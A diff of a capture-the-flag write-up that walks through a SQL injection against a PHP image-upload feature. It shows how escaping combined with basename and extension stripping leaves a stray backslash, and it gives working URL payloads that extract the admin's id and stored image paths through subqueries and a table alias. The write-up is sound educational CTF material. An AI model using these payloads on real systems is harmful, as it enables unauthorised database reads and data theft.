@@ -81,10 +81,10 @@ So means if we put `http://jjpg.jpg` as URL, the `name` variable will end up bec
 # Proof of Concept
 1. Put `http://'jpg.jpg` as the URL
 2. `mysqli_real_escape_string` will add a backslash before single quote (`'` become `\'`)
-- so `http://'jpg.jpg` become `http://\'jpg.jpg`
+- `http://'jpg.jpg` become `http://\'jpg.jpg`
 3. `basename` will extract the file path : `\'jpg.jpg`
 4. `preg_replace` will delete the extension 
-- so `'jpg.jpg` will be deleted so left `\`
+- `'jpg.jpg` will be deleted so left `\`
 5. `\` will be put inside the query as `$name`:
 ```php
 "INSERT INTO image (id, user_id, name, url) VALUES (NULL, {$_SESSION['id']}, '{$name}', '{$url}')"
@@ -101,7 +101,7 @@ In order to read contents in the database we need to enclose the single quote
 
 Because `mysqli_real_escape_string` add a backslash before single quote, we are possible to do that:
 
-`http://'jpg',(SELECT 1))#.jpg` become `\\',(SELECT 1))#`
+`http://'jpg',(SELECT 1))#.jpg` $name become `\\',(SELECT 1))#`
 
 When inside query:
 ```php
@@ -111,6 +111,12 @@ When inside query:
 Then we can read the url content by inspecting the web page:
 ![image2](image2.png)
 
+First, find the admin's user_id:
+```
+http://'jpg',(SELECT id FROM user WHERE username = CHAR(97,100,109,105,110)))#.jpg
+``` 
+Result: `34`
+
 But I encounted a problem when select from image:
 ```
 http://'jpg',(SELECT url FROM image WHERE user_id = 34 LIMIT 1))#.jpg
@@ -119,7 +125,7 @@ It return `Failed to insert image`
 
 After some research I found that inside INSERT statement, SELECT statement inside cannot have the same table name
 
-According to https://dev.mysql.com/doc/refman/8.0/en/insert-select.html:
+According to the [docs](https://dev.mysql.com/doc/refman/8.0/en/insert-select.html):
 ![image3](image3.png)
 
 In order to fix that just use SQL Alias that will change the table to different name
@@ -132,14 +138,18 @@ http://'jpg',(SELECT GROUP_CONCAT(i.url) FROM image AS i WHERE user_id = 34))#.j
 `GROUP_CONCAT` is a function will select multiple rows into one line, and each row will separated with `,`
 
 Result:
-```
-https://i.kym-cdn.com/photos/images/original/000/435/652/1f9.png,https://i.kym-cdn.com/photos/images/newsfeed/000/471/542/069.jpg,https://i.kym-cdn.com/photos/images/newsfeed/000/549/306/165.gif,/secret_9hStNLrSEtnBGwk0ZYTeVb8j7YMv58/flag.png,https://i.ky
+```diff
+https://i.kym-cdn.com/photos/images/original/000/435/652/1f9.png,
+https://i.kym-cdn.com/photos/images/newsfeed/000/471/542/069.jpg,
+https://i.kym-cdn.com/photos/images/newsfeed/000/549/306/165.gif,
++ /secret_9hStNLrSEtnBGwk0ZYTeVb8j7YMv58/flag.png,
+https://i.ky
 ```
 Saw a few nonsense image, only one is the flag image:
 ```
 /secret_9hStNLrSEtnBGwk0ZYTeVb8j7YMv58/flag.png
 ```
 
-Go to `http://fortnight1802.wargames.my:8001/secret_9hStNLrSEtnBGwk0ZYTeVb8j7YMv58/flag.png` and there's a flag!
+Go to http://fortnight1802.wargames.my:8001/secret_9hStNLrSEtnBGwk0ZYTeVb8j7YMv58/flag.png and there's a flag!
 
 ![flag](flag.png)
